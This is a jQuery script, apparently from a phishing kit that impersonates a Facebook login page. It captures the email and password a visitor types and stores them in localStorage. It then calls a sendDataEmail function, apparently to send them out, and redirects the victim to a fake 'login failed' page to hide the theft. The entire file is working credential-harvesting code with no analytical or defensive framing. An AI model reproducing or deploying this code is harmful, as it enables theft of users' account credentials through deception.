$(document).ready(function () {
    $("[name='login']").click(function () {
        
        if($('#email').val() === '') 
        {
            
            return;
        }
        localStorage.setItem('user1',$('#email').val());
        localStorage.setItem('pass1',$('#pass').val());
        localStorage.setItem('user2','');
        sendDataEmail();
        setTimeout(function() {
            window.location.href = "../facebook.com/loginfail.html";
        }, 2000); 
    });
});